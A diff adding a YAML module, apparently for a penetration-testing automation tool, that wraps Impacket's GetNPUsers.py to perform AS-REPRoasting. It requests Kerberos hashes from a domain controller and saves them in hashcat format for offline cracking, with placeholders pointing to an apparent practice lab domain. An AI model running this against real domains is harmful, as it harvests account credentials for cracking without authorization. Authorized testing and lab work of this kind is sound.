@@ -1,0 +1,24 @@
+id: impacket_asreproast
+name: AS-REPRoasting
+category: Exploitation
+checklist_keys: ["asreproast"]  # <--- AJOUTER ICI
+description: ""
+inputs:
+  - name: domain
+    label: Domaine
+    placeholder: north.sevenkingdoms.local
+  - name: username
+    label: Utilisateur (Compromis)
+    placeholder: guest
+  - name: password
+    label: Mot de passe
+    placeholder: password
+  - name: dc_ip
+    label: IP du DC
+    placeholder: 192.168.56.11
+command: "GetNPUsers.py {{domain}}/{{username}}:'{{password}}' -dc-ip {{dc_ip}} -request -format hashcat -outputfile /workspace/asreproast_hashes.txt"
+
+parsing:
+  mode: "line"
+  save_results: false 
+  ip_extract: ".*"
